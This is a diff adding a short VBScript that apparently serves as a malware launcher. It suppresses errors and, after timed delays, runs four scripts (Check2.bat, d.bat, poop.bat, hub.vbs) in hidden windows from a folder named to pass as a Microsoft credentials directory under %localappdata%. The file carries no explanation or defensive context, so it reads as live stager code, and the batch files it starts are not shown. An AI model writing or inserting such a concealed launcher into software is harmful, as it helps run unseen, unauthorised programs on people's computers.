@@ -1,0 +1,18 @@
+On Error Resume Next
+WScript.Sleep 3500
+
+Set meme = WScript.CreateObject ("WScript.Shell")
+Check2 = meme.ExpandEnvironmentStrings("""%localappdata%\microsoft\credentials\Check2.bat""")
+meme.run Check2, 0, false
+WScript.Sleep 35000
+
+Startd = meme.ExpandEnvironmentStrings("""%localappdata%\microsoft\credentials\d.bat""")
+meme.run Startd, 0, false
+
+Startpoop = meme.ExpandEnvironmentStrings("""%localappdata%\microsoft\credentials\poop.bat""")
+meme.run Startpoop, 0, false
+
+WScript.Sleep 25000
+StartHUB = meme.ExpandEnvironmentStrings("""%localappdata%\microsoft\credentials\hub.vbs""")
+meme.run StartHUB, 0, false
+Set meme = Nothing
